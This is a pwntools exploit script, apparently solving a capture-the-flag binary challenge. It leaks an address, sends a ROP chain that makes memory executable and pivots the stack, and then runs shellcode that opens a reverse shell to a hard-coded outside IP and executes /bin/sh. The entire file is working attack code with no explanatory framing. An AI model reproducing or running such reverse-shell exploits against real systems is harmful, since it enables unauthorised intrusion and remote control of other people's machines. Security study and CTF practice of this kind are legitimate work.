

from pwn import *
import codecs

# p = process('files/only-2-buffers')
# p = remote('3.0.58.217', 2021)
p = remote("128.199.157.172", 24901)

context.arch = 'amd64'

ret = 0x000000000040101a
leave_ret = 0x0000000000401221
pop_rdi = 0x00000000004013d3
pop_rsi_r15 = 0x00000000004013d1
dummy = 0xdeadbeefdeadbeef
dev_urandom = 0x402008
r = 0x402015
pop_all = 0x00000000004013ca
open_plt = 0x401100
setvbuf_got = 0x404040
setvbuf_plt = 0x4010f0
getsn = 0x4011f6
add_byte_ptr_rax_bh = 0x40135b
pop_rbp = 0x00000000004011dd

p.recvuntil("address ")
address = int(p.recvuntil(":")[:-1], 16)
print(hex(address))
help_str = address + 0x718

def set_rdi(val):
	return p64(pop_rdi) + p64(val)

def set_rsi(val):
	return p64(pop_rsi_r15) + p64(val) + p64(0)

def set_rbp(val):
	return p64(pop_rbp) + p64(val)

def set_rdi_rsi_rdx(rdi, rsi=0, rdx=0, rbp=1, rbx=0):
	ans = b""
	ans += p64(pop_all)
	ans += p64(rbx)
	ans += p64(rbp)
	ans += p64(rdi)
	ans += p64(rsi)
	ans += p64(rdx)
	ans += p64(address)
	ans += p64(0x00000000004013b0)
	ans += p64(dummy)
	ans += p64(0x49494949)
	ans += p64(rbp)
	ans += p64(dummy)
	ans += p64(dummy)
	ans += p64(dummy)
	ans += p64(dummy)
	return ans

sc = '''
mov rdi, 0
mov rax, 3
syscall
'''
# sc += shellcraft.connect('3.0.58.217', 3001)
sc += shellcraft.connect('54.255.130.43', 3001)
sc += '''
mov rdi, 0
mov rsi, 1
mov rax, 33
syscall
'''
sc += shellcraft.pushstr("/bin/sh\x00")
sc += '''
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
'''

payload = p64(ret)*200 + set_rdi_rsi_rdx(dev_urandom, 0, 1) + p64(open_plt)
payload += set_rdi(setvbuf_got) + set_rsi(1) + p64(getsn) + set_rdi(1) + set_rbp(address + 0x760) + p64(add_byte_ptr_rax_bh) + p64(ret)*12
payload += (set_rdi_rsi_rdx(dev_urandom, 0, 1) + p64(open_plt))*10 + set_rdi_rsi_rdx(address, 0x1000, 7) + p64(setvbuf_plt) + p64(ret)*11
payload += p64(address + 0xd70) + b'\x90'*0x18
payload += asm(sc)
p.sendline(payload)

payload = b"A"*32 + p64(address) + p64(leave_ret)
pause()
p.sendlineafter('stack', payload)

p.interactive()
p.close()